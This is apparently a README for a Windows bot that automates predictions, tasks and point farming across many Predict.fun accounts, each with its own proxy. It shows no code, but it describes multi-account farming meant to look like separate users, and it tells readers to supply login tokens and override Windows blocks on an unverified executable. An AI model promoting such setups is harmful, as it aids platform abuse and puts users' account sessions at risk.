## 🚀 What this app does

Predict-Fun-Farming-Bot helps you run Predict.fun accounts with less manual work. It can place predictions, complete daily tasks, and farm points across many accounts. It also supports a separate proxy for each account, so you can keep accounts organized.

## 🖥️ Windows setup

This app is built for Windows users who want a simple way to get started.

### What you need
- A Windows 10 or Windows 11 PC
- A browser to open the download page
- A Predict.fun account for each profile you want to use
- Internet access
- A proxy for each account if you plan to use multiple accounts

### Before you start
- Make sure you have enough free disk space for the app files
- Keep your login details ready
- Use one folder for the bot so it stays easy to find
- If Windows asks for permission, allow the app to run

1. Open the folder where you saved the files
2. Start the app by double-clicking the main program file

## 🧩 First-time setup

When you open the bot for the first time, you may need to enter basic account details.

### Common setup items
- Account name
- Login session or token
- Proxy address
- Proxy username and password, if needed
- Task settings
- Prediction settings

### Simple way to organize accounts
Use one line or one profile per account. Keep details in the same order each time. This makes it easier to avoid mix-ups when you manage many accounts.

### Proxy setup
If you use more than one account, assign one proxy to each account. This keeps traffic separate and helps each account run with its own connection.

A common proxy format looks like this:
- IP address
- Port
- Username
- Password

## ❗ If something goes wrong

### The app does not open
- Try running it again as admin
- Check that the file finished downloading
- Make sure Windows did not block the file
- Re-extract the ZIP file if you used one

### The bot cannot log in
- Check your account details
- Make sure the session or token is still valid
- Confirm the account can still access Predict.fun
- Try the account in a browser first

### A proxy fails
- Check the IP, port, username, and password
- Make sure the proxy server is online
- Try a different proxy
- Confirm the proxy matches the account

### The app stops during farming
- Check your internet connection
- Restart the bot
- Open a fresh session for the account
- Make sure the release file is current
